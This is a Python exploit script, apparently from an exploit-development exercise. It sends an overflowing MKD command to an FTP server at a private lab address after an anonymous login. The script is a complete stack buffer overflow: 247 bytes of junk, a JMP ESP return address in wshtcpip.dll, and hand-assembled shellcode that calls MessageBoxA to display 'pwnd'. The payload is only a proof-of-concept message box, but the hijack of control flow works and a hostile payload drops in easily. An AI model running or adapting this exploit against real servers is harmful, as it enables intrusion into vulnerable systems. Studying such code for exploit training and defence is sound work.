#!/usr/bin/python

import socket
import struct

HOST = "192.168.139.128"
PORT = 21
# ------------------------------------
# Badchars: \x00\x0A\x0D 
# 0x71a91c8b : jmp esp | wshtcpip.dll
# Address=7E4507EA USER32 Section=.text Name=MessageBoxA
# https://msdn.microsoft.com/en-us/library/windows/desktop/ms645505(v=vs.85).aspx
# ------------------------------------

shellcode = ""
shellcode += "\x90" * 20
shellcode += "\x33\xC0"                 # XOR EAX,EAX   \
shellcode += "\x33\xC9"                 # XOR ECX,ECX    | Zero out registers
shellcode += "\x33\xD2"                 # XOR EDX,EDX   /
shellcode += "\x50"                     # PUSH EAX      | Push EAX to have null-byte padding for "pwnd"
shellcode += "\x68\x70\x77\x6e\x64"     # PUSH "pwnd"   | Push The ASCII string to the stack
shellcode += "\x8B\xD4"                 # MOV EDX,ESP   | Put a pointer to lpText string in EDX
shellcode += "\x51"                     # PUSH ECX      | Push uType=0x00000000
shellcode += "\x51"                     # PUSH ECX      | Push lpCaption
shellcode += "\x52"                     # PUSH EDX      | Push lpText
shellcode += "\x51"                     # PUSH ECX      | Push hWnd=0x00000000
shellcode += "\xBA\xEA\x07\x45\x7E"     # MOV EDX,USER32.MessageBoxA | Move the pointer to MessageBoxA() into EDX
shellcode += "\xFF\xD2"                 # CALL EDX      | Call MessageBoxA()
shellcode += "\x90" * 20
junk = "A"*247
jmp_esp = struct.pack("<I", 0x71a91c8b)
evil = junk + jmp_esp + shellcode + "\x42" * (1000-len(junk)-len(jmp_esp)-len(shellcode))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.recv(1024)
s.close()